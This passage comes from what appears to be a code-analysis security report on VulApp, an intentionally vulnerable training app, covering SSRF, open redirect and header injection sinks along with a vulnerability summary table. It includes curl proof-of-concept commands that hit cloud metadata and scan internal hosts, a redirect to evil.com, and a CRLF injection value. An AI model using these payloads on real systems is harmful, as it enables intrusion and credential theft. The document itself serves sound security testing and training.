- Access internal-only services
- Port scanning internal systems

**Proof of Concept:**
```bash
# Access AWS metadata
curl "http://localhost:5001/api/fetch-url?url=http://169.254.169.254/latest/meta-data/"

# Internal network scan
curl "http://localhost:5001/api/fetch-url?url=http://192.168.1.1:8080/"

# Port scan
curl "http://localhost:5001/api/fetch-url?url=http://localhost:22/"
```

### Open Redirect Sink

**File:** `/repos/VulApp/backend/routes/utils.js`
**Lines 70-77:**
```javascript
router.get('/redirect', (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).json({ error: 'URL parameter is required' });

  // VULNERABILITY: No validation of redirect target
  console.log(`[VULN] Open redirect to: ${url}`);
  res.redirect(url);
});
```

**User Input Source:** `req.query.url` parameter
**Validation:** NONE
**Impact:**
- Phishing attacks (redirect to malicious site via trusted domain)
- Cookie theft via redirect
- Bypass CSRF protections

**Proof of Concept:**
```bash
curl -L "http://localhost:5001/api/utils/redirect?url=https://evil.com/phishing"
```

### Header Injection Sink

**File:** `/repos/VulApp/backend/routes/utils.js`
**Lines 85-91:**
```javascript
router.get('/lang', (req, res) => {
  const { lang } = req.query;
  if (!lang) return res.status(400).json({ error: 'lang parameter is required' });

  // VULNERABILITY: Reflecting user input in header without sanitization
  res.setHeader('X-Language', lang);
  res.json({ message: `Language set to: ${lang}` });
});
```

**User Input Source:** `req.query.lang` parameter
**Validation:** NONE
**Impact:** HTTP response splitting via CRLF injection (`lang=en%0d%0aX-Injected: true`)

### Categories NOT Present in VulApp

The following SSRF-related categories were searched for but **no instances found**:
- SSO/OAuth Discovery Endpoints (no OAuth implemented)
- Link Previewers/Unfurlers
- Webhook Handlers
- Cloud Metadata Access in application code (only reachable via SSRF)
- CSV/JSON/XML Importers from URLs
- Package/Plugin Installers from URLs

---

## Vulnerability Summary Table

| Category | Severity | File | Line | Exploitable Remotely |
|----------|----------|------|------|---------------------|
| JWT None Algorithm Bypass | CRITICAL | `middleware/auth.js` | 22-25 | Yes |
| SQL Injection | CRITICAL | `routes/projects.js` | 29 | Yes |
| Command Injection | CRITICAL | `routes/utils.js` | 16 | Yes |
| Hardcoded JWT Secret | CRITICAL | `middleware/auth.js` | 4 | Yes |
| Plaintext Password Storage | CRITICAL | `db.js` | 12 | Via other vulns |
| SSRF | CRITICAL | `routes/debug.js` | 27 | Yes |
| IDOR (All Operations) | CRITICAL | `routes/projects.js` | 15,53,89 | Yes |
| Secrets in Debug Endpoint | CRITICAL | `routes/debug.js` | 14 | Yes |
| Stored XSS | HIGH | `routes/projects.js` + Dashboard.jsx | 43, 77 | Yes |
| Path Traversal | HIGH | `routes/files.js` | 57 | Yes |
| Unrestricted File Upload | HIGH | `routes/files.js` | 15 | Yes |
| Prototype Pollution | HIGH | `routes/utils.js` | 51 | Yes |
| Mass Assignment | HIGH | `routes/auth.js` | 62 | Yes |
| Payment Bypass | HIGH | `routes/payment.js` | 11 | Yes |
| localStorage JWT | HIGH | `frontend/src/pages/Login.jsx` | 15 | Via XSS |
| Open Redirect | MEDIUM | `routes/utils.js` | 76 | Yes |
| Header Injection | MEDIUM | `routes/utils.js` | 90 | Yes |
| CORS Wildcard | MEDIUM | `server.js` | 11 | Yes |
| No Rate Limiting | MEDIUM | N/A | N/A | Yes |
| ReDoS | MEDIUM | `routes/utils.js` | 105 | Yes |

---

## Conclusion

**PRE-RECON CODE ANALYSIS COMPLETE**

This VulApp application is a **deliberately vulnerable by design** security training target containing **27+ documented vulnerabilities**. From an external attacker's perspective, the most critical paths to compromise are:

1. **Authentication Bypass:** Forge admin JWT via none algorithm → Full application access
2. **SQL Injection:** Extract database contents → All user credentials (plaintext)
3. **Command Injection:** RCE via ping endpoint → Server compromise
4. **IDOR + XSS:** Steal other users' tokens → Account takeover
5. **SSRF:** Access cloud metadata → Infrastructure credentials

All findings are based on direct code analysis and represent accurate security posture assessment of this intentionally vulnerable application.
